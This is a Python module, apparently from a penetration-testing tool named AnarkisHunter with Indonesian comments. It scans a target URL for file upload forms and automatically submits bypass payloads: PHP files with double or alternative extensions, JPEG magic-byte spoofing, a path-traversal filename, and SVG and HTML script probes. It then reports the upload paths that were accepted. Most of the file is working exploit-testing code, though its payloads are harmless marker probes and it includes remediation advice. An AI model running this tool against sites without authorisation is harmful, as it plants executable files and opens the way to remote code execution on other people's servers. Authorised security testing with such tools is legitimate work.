"""
AnarkisHunter — vuln_upload.py
================================
File upload vulnerability tester.
Cari upload form, test upload file dengan berbagai bypass:
double extension, content-type spoofing, magic bytes, null bytes.

Usage standalone:
    python modules/vuln/vuln_upload.py --url http://target.local/upload
"""

import sys
import re
import argparse
from pathlib import Path
from typing import Dict, List, Optional

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from modules.utils.utils_request import HTTPClient, normalize_url
from modules.utils.report import ScanResult


# Test files dengan berbagai bypass
TEST_FILES = [
    {
        "name": "shell.php",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "application/x-php",
        "bypass": "direct php upload",
    },
    {
        "name": "shell.php.jpg",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "image/jpeg",
        "bypass": "double extension",
    },
    {
        "name": "shell.jpg.php",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "image/jpeg",
        "bypass": "double extension reverse",
    },
    {
        "name": "shell.phtml",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "application/x-php",
        "bypass": "alternative php ext",
    },
    {
        "name": "shell.php5",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "application/x-php",
        "bypass": "php5 ext",
    },
    {
        "name": "shell.phar",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "application/octet-stream",
        "bypass": "phar archive",
    },
    {
        "name": "shell.jpg",
        # Magic bytes JPG + PHP payload
        "content": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01" + b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "image/jpeg",
        "bypass": "magic bytes spoofing",
    },
    {
        "name": "shell.svg",
        "content": b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        "ctype": "image/svg+xml",
        "bypass": "SVG with embedded JS",
    },
    {
        "name": "shell.html",
        "content": b"<script>alert('ANARK_XSS_PROBE')</script>",
        "ctype": "text/html",
        "bypass": "HTML upload (XSS)",
    },
    {
        "name": "..%2Fshell.php",
        "content": b"<?php echo 'ANARK_RCE_PROBE'; ?>",
        "ctype": "application/x-php",
        "bypass": "path traversal in name",
    },
]


def find_upload_forms(html: str) -> List[Dict]:
    """Cari form dengan enctype multipart/form-data + input type=file."""
    forms = []
    for m in re.finditer(r"<form([^>]*)>([\s\S]*?)</form>", html, re.I):
        attrs = m.group(1)
        body = m.group(2)
        if re.search(r'enctype=["\']multipart/form-data["\']', attrs, re.I) or \
                re.search(r'<input[^>]*type=["\']file["\']', body, re.I):
            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            method_m = re.search(r'method=["\']([^"\']*)["\']', attrs, re.I)
            file_input = re.search(r'<input[^>]*type=["\']file["\'][^>]*name=["\']([^"\']*)["\']',
                                   body, re.I)
            forms.append({
                "action": action_m.group(1) if action_m else "",
                "method": (method_m.group(1).upper() if method_m else "POST"),
                "file_field": file_input.group(1) if file_input else "file",
            })
    return forms


def run_upload_scan(
    target: str,
    file_field: Optional[str] = None,
    upload_endpoint: Optional[str] = None,
    timeout: int = 12,
) -> Dict:
    """Scan upload vulnerabilities."""
    url = normalize_url(target)
    result = {
        "target": url,
        "upload_forms": [],
        "vulnerabilities": [],
        "uploaded_paths": [],
        "error": None,
    }

    try:
        with HTTPClient(timeout=timeout) as client:
            if upload_endpoint:
                endpoint = normalize_url(upload_endpoint) if upload_endpoint.startswith("http") else url
                field = file_field or "file"
                forms = [{"action": endpoint, "method": "POST", "file_field": field}]
            else:
                # Discover upload form di target
                resp = client.get(url)
                if not resp:
                    result["error"] = "Connection failed"
                    return result
                forms = find_upload_forms(resp.text)
                if not forms:
                    result["error"] = "No upload form found"
                    return result

            result["upload_forms"] = forms

            for form in forms:
                action = form["action"]
                if not action:
                    action = url
                elif not action.startswith("http"):
                    from urllib.parse import urljoin
                    action = urljoin(url, action)

                for tf in TEST_FILES:
                    files = {form["file_field"]: (tf["name"], tf["content"], tf["ctype"])}
                    try:
                        resp = client._session.post(
                            action, files=files, timeout=timeout, allow_redirects=True
                        )
                        if not resp:
                            continue
                        body_lower = resp.text.lower()[:5000]
                        # Heuristik success indicators
                        success_kw = ["uploaded", "success", "berhasil"]
                        success = (resp.status_code in {200, 201, 302} and
                                   any(kw in body_lower for kw in success_kw))

                        # Cari uploaded path di response
                        path_m = re.search(r'(?:href|src)=["\']([^"\']*' + re.escape(tf["name"].split("/")[-1]) + r'[^"\']*)["\']', resp.text, re.I)
                        uploaded_path = path_m.group(1) if path_m else None

                        if success or uploaded_path:
                            result["vulnerabilities"].append({
                                "filename": tf["name"],
                                "bypass": tf["bypass"],
                                "status": resp.status_code,
                                "endpoint": action,
                                "uploaded_path": uploaded_path,
                                "evidence": resp.text[:300],
                            })
                            if uploaded_path:
                                result["uploaded_paths"].append(uploaded_path)
                    except Exception:
                        continue

    except Exception as e:
        result["error"] = str(e)

    return result


def analyze_upload_findings(data: Dict) -> List[ScanResult]:
    findings = []
    for v in data.get("vulnerabilities", []):
        sev = "CRITICAL" if v["filename"].endswith((".php", ".phtml", ".php5", ".phar")) else "HIGH"
        findings.append(ScanResult(
            title=f"Unrestricted File Upload — bypass: {v['bypass']}",
            severity=sev,
            description=f"File berbahaya dapat di-upload: {v['filename']}",
            url=v["endpoint"],
            evidence=f"Bypass: {v['bypass']} | Status: {v['status']} | Uploaded: {v.get('uploaded_path', 'N/A')}",
            payload=f"Filename={v['filename']}",
            recommendation=(
                "Whitelist extension; validate magic bytes; rename file; "
                "simpan di luar webroot; disable script execution di folder upload"
            ),
            owasp="A04",
            module="vuln_upload",
        ))
    return findings


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    from rich.console import Console
    from rich.table import Table

    console = Console()
    parser = argparse.ArgumentParser(description="AnarkisHunter — File Upload Tester")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--endpoint", help="Upload endpoint (jika berbeda)")
    parser.add_argument("--field", help="File input field name", default="file")
    args = parser.parse_args()

    console.print(f"\n[red]📤 Upload Scan: [bold]{args.url}[/bold][/red]\n")
    data = run_upload_scan(args.url, args.field, args.endpoint)

    if data.get("error"):
        console.print(f"[red]Error: {data['error']}[/red]")
        sys.exit(1)

    console.print(f"[green]Upload forms:[/green] {len(data['upload_forms'])}")
    console.print(f"[red]Vulns:[/red] {len(data['vulnerabilities'])}")
    console.print(f"[red]Uploaded paths:[/red] {len(data['uploaded_paths'])}\n")

    if data["vulnerabilities"]:
        t = Table(title="🚨 Upload Findings", border_style="red")
        t.add_column("File", style="cyan", overflow="fold")
        t.add_column("Bypass", style="yellow", overflow="fold")
        t.add_column("Status", style="white", width=8)
        t.add_column("Uploaded Path", style="red", overflow="fold")
        for v in data["vulnerabilities"]:
            t.add_row(v["filename"], v["bypass"], str(v["status"]), v.get("uploaded_path", "") or "-")
        console.print(t)
